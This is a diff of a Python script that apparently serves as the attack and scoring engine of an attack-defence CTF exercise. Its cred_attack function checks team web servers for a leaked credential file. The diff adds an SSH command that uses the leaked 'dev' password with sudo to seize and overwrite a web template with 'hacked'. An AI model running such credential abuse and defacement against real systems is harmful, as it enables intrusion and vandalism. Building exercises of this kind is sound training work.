@@ -19,13 +19,11 @@ hosts = {
 	2: "8.211.137.20"
 }
 
-
-# port = 10000 + 1000 * team_id + ports["ssh"]
 ports = {
 	"ftp": 21,
 	"ssh": 22,
-	"http1": 81,
-	"http2": 80,
+	"http1": 80,
+	"http2": 8080,
 	"vsftpd": 6200,
 }
 
@@ -119,7 +117,7 @@ def cred_attack(team_id):
 		if res.status_code == 200:
 			if "dev" in res.text and "devpass123" in res.text:
 				print("\033[31mteam", team_id, target + ":" + str(port) ,"has credential file: ", u,"\033[0m")
-				exploit = exploit = "echo root | su - root -c \"\""
+				exploit = exploit = "echo devpass123 | sudo -S chown dev:dev /var/www/html/webapp/templates/index.html && echo hacked | sudo tee /var/www/html/webapp/templates/index.html > /dev/null"
 				m1_brute.sshc(team_id, target, port, "dev", "devpass123", exploit)
 			else:
 				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
